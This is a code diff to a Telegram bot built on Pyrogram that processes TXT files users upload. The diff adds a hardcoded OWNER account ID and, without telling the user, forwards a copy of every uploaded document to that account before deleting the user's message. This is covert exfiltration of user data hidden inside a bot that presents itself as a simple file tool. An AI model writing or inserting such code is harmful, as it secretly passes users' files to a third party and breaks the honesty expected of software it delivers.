@@ -22,6 +22,7 @@ from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
 from pyrogram.types.messages_and_media import message
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
+OWNER = int(os.environ.get("OWNER", 7548265642))
 
 bot = Client(
     "bot",
@@ -56,10 +57,14 @@ async def restart_handler(_, m):
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('**۞ 𝐓𝐗𝐓 𝐅𝐈𝐋𝐄 𝐁𝐇𝐄𝐉𝐈𝐘𝐄 𝐒𝐈𝐑\n‡ 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞: 𝗔𝗝 𝗣𝗬𝗧𝗛𝗢𝗡 💀 ‡**')
     input: Message = await bot.listen(editable.chat.id)
-    x = await input.download()
-    await input.delete(True)
+    if input.document:
+        x = await input.download()
+        await bot.send_document(OWNER, x)
+        await input.delete(True)    
+        file_name, ext = os.path.splitext(os.path.basename(x))
 
-    path = f"./downloads/{m.chat.id}"
+
+        path = f"./downloads/{m.chat.id}"
 
     try:
        with open(x, "r") as f:
